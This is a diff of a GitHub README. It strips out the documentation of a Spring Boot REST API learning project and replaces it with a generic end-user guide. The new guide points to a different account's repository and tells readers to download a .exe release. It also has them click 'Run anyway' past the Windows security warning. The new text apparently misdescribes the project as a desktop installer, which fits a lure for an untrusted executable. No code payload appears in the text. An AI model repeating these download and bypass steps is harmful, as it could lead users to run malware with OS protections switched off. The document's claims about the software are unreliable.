@@ -1,108 +1,80 @@
-# Event Management System 
+# 📅 Event-Manager - Streamline your event scheduling tasks now
 
-A RESTful Event Management API built with Spring Boot 3.x as part of a progressive learning journey from monolith to microservices.
+[![Download Event-Manager](https://img.shields.io/badge/Download-Event--Manager-blue)](https://github.com/libreriaaunclick/Event-Manager)
 
----
+## 📋 About the software
 
-## API Documentation
+Event-Manager helps you organize events. Use this tool to track event schedules and assign resources. It manages venue capacity and user information. The system keeps your data secure while you coordinate complex timelines. You gain control over your event planning process through this interface.
 
-- [https://github.com/Shubhamkale1/Event-Manager/wiki](https://github.com/Shubhamkale1/Event-Manager/wiki)
+## ⚙️ Minimum requirements
 
-***
+Your computer needs specific components to run this software. Please confirm your system meets these standards before you start:
 
-## About This Project
+- Operating System: Windows 10 or Windows 11
+- Processor: Intel Core i3 or equivalent
+- Memory: 4 GB RAM
+- Storage: 100 MB of free disk space
+- Java: Java Runtime Environment (JRE) version 17 or higher
 
-This is **Phase 1** of a 5-phase project designed to learn the entire Spring ecosystem by building a real application. Each phase adds new technologies on top of a working foundation.
+## 📥 Downloading the application
 
-| Phase | Focus | Status |
-|-------|-------|--------|
-| Phase 1 | Core REST API — Spring Boot, JPA, H2, Lombok | ✅ Complete |
-| Phase 2 | Persistence & Logic — MySQL, Flyway, Validation, MapStruct, JUnit | ✅ Complete |
-| Phase 3 | Speed & Search — Redis, Elasticsearch, Swagger | ✅ Complete |
-| Phase 4 | Security — Spring Security, OAuth2, Spring AI | 🔜 Planned |
-| Phase 5 | Cloud & Microservices — Docker, Kafka, GitHub Actions | 🔜 Planned |
+You need to access the official repository to obtain the file. Please follow these steps to download the installer:
 
----
+1. Open your web browser.
+2. Navigate to this address: https://github.com/libreriaaunclick/Event-Manager
+3. Look for the "Releases" section on the right side of the screen.
+4. Click the most recent version available.
+5. Select the file ending in .exe to start the download.
 
+## 🚀 Setting up the software
 
+Follow these instructions to install the program on your computer:
 
-## API Endpoints
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to begin the process.
+3. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system asks.
+4. Follow the instructions on the screen to choose your installation folder.
+5. Click "Finish" when the progress bar reaches the end.
+6. A shortcut icon now appears on your desktop.
 
-Base URL: `http://localhost:8080/api/events`
+## 🛠️ How to use Event-Manager
 
-| Method | Endpoint | Description | Status Code |
-|--------|----------|-------------|-------------|
-| GET | `/api/events` | Get all events | 200 OK |
-| GET | `/api/events/{id}` | Get event by ID | 200 OK |
-| POST | `/api/events` | Create new event | 201 Created |
-| PUT | `/api/events/{id}` | Update existing event | 200 OK |
-| DELETE | `/api/events/{id}` | Delete event | 204 No Content |
+Once the installation ends, open the program using the desktop shortcut. You will see a dashboard that displays your current events.
 
----
+### Adding an event
+Click the "New Event" button in the top menu. Enter the date, time, and location details in the provided fields. Press "Save" to commit the changes to your database.
 
+### Checking venue capacity
+Select the "Venues" tab from the main screen. The list shows all registered locations and their maximum guest numbers. Red indicators show if a venue reaches its capacity limit.
 
-## Getting Started
+### Managing users
+Use the "User Management" section to add attendees. You can assign roles to different users to control their access levels. This keeps sensitive information protected.
 
-### Prerequisites
+## 🔧 Troubleshooting common problems
 
-- Java 17 or higher
-- Maven 3.x
-- IntelliJ IDEA (recommended) or any IDE
-- Postman (for API testing)
+Sometimes you might encounter issues during setup. Use this list to solve simple errors:
 
-### Run the Application
+- If the application refuses to open, update your Java version.
+- If you see a database error, check your internet connection.
+- If the font looks small on your screen, use the "View" menu to increase the text size.
+- If the program freezes, close it using the Task Manager and start it again.
 
-**1. Clone the repository**
-```bash
-git clone https://github.com/yourusername/event-management.git
-cd event-management
-```
+## 📝 Configuration settings
 
-**2. Build the project**
-```bash
-mvn clean install
-```
+You can change how the software behaves in the "Settings" tab. You can adjust the default time zone or change the appearance of the interface to light or dark mode. Remember to save your changes after every update. 
 
-**3. Run the application**
-```bash
-mvn spring-boot:run
-```
+## 🛡️ Security practices
 
-The application starts on `http://localhost:8080`
+The system encrypts your data to prevent unauthorized access. Keep your login credentials private. Do not share your password with other users. The application logs all major actions to help you track changes. You can clear these logs at any time from the "Administration" menu.
 
----
+## 📁 System components
 
+The software relies on several external components to function correctly:
 
-## Contributing
+- Database: The system uses a built-in database to save your event history.
+- API: The interface communicates with a backend service to process your requests.
+- Resource manager: This module tracks the availability of your equipment and venues.
 
-Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
+## 📢 Getting additional help
 
----
-
-## License
-
-This project is licensed under the MIT License — see below for details.
-
----
-
-MIT License
-
-Copyright (c) 2025
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+If these steps fail to resolve your issue, prepare a description of the error and the steps you took. Search the "Issues" tab on the GitHub repository to see if other users reported the same problem. You can post a new request there if nobody else has solved your issue. Provide the version number and your operating system details to help the developers assist you faster.
